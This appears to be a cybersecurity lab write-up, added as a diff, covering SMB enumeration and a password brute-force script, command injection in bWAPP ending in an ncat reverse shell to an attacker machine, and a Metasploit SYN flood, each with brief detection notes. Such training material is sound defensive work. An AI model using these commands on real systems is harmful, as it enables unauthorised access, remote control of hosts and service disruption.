@@ -1,0 +1,65 @@
+⚙️ Exercise 1: Brute Force Attack Detection via SMB
+🛠️ Tools Used
+nmap, enum4linux, smbclient
+
+Windows Event Viewer
+
+🔐 Enumeration Steps
+
+nmap -Pn 192.168.0.2
+enum4linux 192.168.0.2
+smbclient //192.168.0.2/administrator
+
+🔁 Brute Force Script (brute.sh)
+
+#!/bin/bash
+for i in {0..20}; do
+    echo "Trying password: $i"
+    smbclient //192.168.0.2/administrator -U administrator%$i
+done
+
+📍 Detection
+Logs viewed in: Event Viewer > Microsoft > Windows > SMBServer > Security Logs
+
+Indicators: Multiple failed authentication attempts from 192.168.0.5
+
+⚠️ Exercise 2: Command Injection & Reverse Shell
+
+🔐 Vulnerable Application
+bWAPP running on Apache/MySQL via XAMPP on ACIDM01
+
+🔧 Injection Test Commands
+
+www.nsa.gov|netstat -n           # Confirms vulnerability
+www.nsa.gov|systeminfo           # Confirms Windows environment
+www.nsa.gov|whoami               # Confirm privileges
+www.nsa.gov|ncat -h              # Confirms ncat installed
+
+💣 Reverse Shell Command (from bwapp DNS field)
+www.nsa.gov|ncat 192.168.0.5 443 -e cmd.exe
+
+🖥️ On Attacker Machine (ACIKALI)
+ncat -lvp 443
+🧾 Validation
+whoami
+# Output: aciplab\administrator
+
+🌊 Exercise 3: SYN Flood Attack
+🔧 Tool: Metasploit Framework
+msfconsole
+use auxiliary/dos/tcp/synflood
+set RHOST 192.168.0.2
+set RPORT 445
+run
+
+📍 Detection
+Use netstat -n and Task Manager on ACIDM01 to observe abnormal connection volume.
+
+💼 Real-World Relevance
+
+Skill	Real-World Use
+SMB Enumeration	Vulnerability scanning, audit defense
+Brute Force Attack	Pen testing, failed login monitoring
+Command Injection	Web app hardening, DevSecOps
+Reverse Shell	Exploitation and incident detection
+SYN Flood	Network DoS protection and firewall tuning
